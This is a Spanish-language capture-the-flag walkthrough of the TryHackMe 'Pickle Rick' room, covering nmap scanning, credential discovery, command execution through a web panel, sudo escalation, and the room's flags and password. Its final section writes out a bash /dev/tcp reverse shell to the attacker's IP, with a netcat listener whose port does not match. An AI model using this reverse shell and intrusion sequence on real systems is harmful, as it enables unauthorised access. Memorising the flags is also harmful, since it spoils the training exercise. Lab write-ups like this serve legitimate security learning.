# Pickle Rick

###### tags: `Try Hack Me` `Linux` `RCE` `Hacking Web`
________________________

### **FLAGS:** 
    - 1a Flag: mr. meeseek hair
    - 2a Flag: 1 jerry tear
    - 3a Flag: fleeb juice

________________________

### **USERS:**
    - R1ckRul3s (pwd: Wubbalubbadubdub)
    - rick

________________________

### **PASOS**

1. Vemos si el host esta levantado y saber el SSOO (**Linux**: TTL <= 64)
<code>ping -c1 IP</code>

    ![](https://i.imgur.com/NWLbeie.png)

2. Escaneamos los puertos abiertos

    - Primero vemos si va muy lento el escaneo:
    <code>nmap -p- --open -T5 -v -n IP</code>
    
            -p-		Todos los puertos
            --open 	Mostrar solos puertos abiertos
            -T5		Modo más agresivo
            -v 		Modo verbose (reporta por pantalla)
            -n		No aplicar resolución DNS
        

        ![](https://i.imgur.com/gWxxY9A.png)

        
    - Como va lento, lanzamos este otro comando:
    <code>nmap -sS --min-rate 5000 -p- -vvv -n -Pn IP</code>
    
            -sS		Realizar un TCP SYN port scan
            --min-rate	Emitir al menos 5000 paquetes por segundo
            -Pn		No realizar Host Discovery

        ![](https://i.imgur.com/JAEFKGW.png)



     - Va más rápido y encuentra los puertos 22 (SSH) y 80 (HTTP)
     
        ![](https://i.imgur.com/SCNJXL1.png)

3. Obtenemos los servicios que corren en los puertos
<code>nmap -sC -sV -p22,80 IP</code>

    ![](https://i.imgur.com/vcjfeGc.png)

4. Nos centramos en el servidor web Apache. Lanzamos un whatweb para ver si usa algún CMS tipo Wordpress, pero vemos que no, es un Apache normal

    ![](https://i.imgur.com/J921J1B.png)

5. Accedemos al portal web y vemos lo mismo con Wappalyzer. El portal no nos dice nada.

    <img src="https://i.imgur.com/yvDOX0b.png" width="1000" />
    
6. Vemos el código fuente de la página a ver si encontramos algo. Vemos un usuario: **R1ckRul3es**

    ![](https://i.imgur.com/FJWnZFz.png)


7. Vamos a hacer un fuzzing en el portal para encontrar alguna ruta con un script de enumeración de NMAP

    <code>nmap -sV --script=http-enum IP</code>

    ![](https://i.imgur.com/lKPWBUS.png)

    - Al acceder a "login.php" vemos un portal de login:

        <img src="https://i.imgur.com/mtnaKJs.png" width="800" />

    - Al acceder a "robots.txt" vemos lo que podría ser una password: **Wubbalubbadubdub**
    
        ![](https://i.imgur.com/WWDT3kt.png)

8. Probamos el usuario y la contraseña en el portal del login. Es OK. Vemos el siguiente panel: 

    ![](https://i.imgur.com/TfDHG6G.png)
    
    - Parece un panel para ejecutar comandos en el servidor (RCE). Probamos con un whoami o ls

        ![](https://i.imgur.com/i7T6lM0.png)
        ![](https://i.imgur.com/4b7I0Z8.png)

9. Vemos un fichero Sup3rS3cretPickl3Ingred.txt. Lo abrimos en el navegador (http://IP/Sup3rS3cretPickl3Ingred.txt)

    ![](https://i.imgur.com/h12CEOb.png)

    <mark>Tenemos la primera flag: **mr. meeseek hair**</mark>

10. Probamos a hacer directory listing a través de comandos. Llegamos al directorio raiz y en el /home vemos un directorio rick

    ![](https://i.imgur.com/GwHo1lj.png)
    ![](https://i.imgur.com/nSYDwbD.png)

11. Dentro vemos un fichero second ingredients. Lo intentamos abrir con el navegador pero no es posible hacer una LFI.

    ![](https://i.imgur.com/rxtEVM9.png)

    - Intentamos ver el fichero pero nos deniega el comando cat:
    
        ![](https://i.imgur.com/p5hdK9Z.png)

    - Probamos otros comandos (head, tail, less, grep) hasta encontrar alguno que funciona:

        ![](https://i.imgur.com/jRVhF3a.png)

    <mark>Tenemos la segunda flag: **1 jerry tear**</mark>

12. Ejecutamos el comando sudo -l para ver que permisos tiene el usuario www-data:

    ![](https://i.imgur.com/bxcWcRX.png)
    
    - No se rick, parece falso: www-root puede ejecutar cualquier comando sin password. Lanzamos un ls sobre el directorio /root

        ![](https://i.imgur.com/rF879Va.png)

    - Vemos el fichero 3rd.txt con la 3a flag. Con el mismo grep de antes pero con sudo, vemos la flag:

        <code>sudo grep "" ../../../root/3rd.txt</code>
        
        ![](https://i.imgur.com/ctgXtKn.png)

    <mark>Tenemos la tercera flag: **fleeb juice**</mark>

______________

### **GET A SHELL** 

Vamos a intentar acceder con shell reversa. Usamos este [Cheat-Sheet](https://ironhackers.es/herramientas/reverse-shell-cheat-sheet/).

- Levantamos un puerto en escucha en nuestro Kali:

    <code>nc -lvp 8433</code>
    
    ![](https://i.imgur.com/OhyGOCd.png)

- En el panel de comandos, lanzamos la shell indicando nuestra IP local en la red de THM:

    <code>bash -c 'exec bash -i &>/dev/tcp/IP/8443 <&1'</code>
    
    ![](https://i.imgur.com/bYrShyN.png)

- Conseguimos una Shell en el servidor como el usuario www-data. Podemos ver las 3 flags de la misma forma:

    ![](https://i.imgur.com/RwMgAkt.png)
    
- Podemos configurar una shell interactiva escribiendo lo siguiente por la shell reversa:

    1. script /dev/null -c bash
    2. CTRL + Z
    3. stty raw -echo
    4. fg
    5. reset
    6. xterm
    7. export TERM=xterm
    8. export SHELL=bash
    9. stty -a
    10. stty rows *NumRows* columns *NumCols*
        
    *Obtenemos NumRows y NumCols con stty -a en otra terminal con la misma dimensión que la shell reversa*
